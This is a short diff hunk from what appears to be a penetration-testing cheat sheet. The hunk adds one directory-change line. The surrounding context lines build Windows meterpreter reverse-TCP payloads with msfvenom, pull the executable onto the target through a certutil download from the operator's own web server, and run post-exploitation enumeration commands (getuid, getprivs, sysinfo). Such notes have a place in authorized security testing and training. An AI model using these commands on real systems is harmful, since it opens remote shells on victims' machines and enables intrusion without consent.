@@ -449,6 +449,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o msf
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o msfshell64.exe; cp msfshell64.exe msfshell.exe
 powershell -c 'certutil -urlcache -f http://$MYIP:8088/msfshell.exe C:\programdata\msfshell.exe'
 
+cd \\users
 getuid
 getprivs
 sysinfo
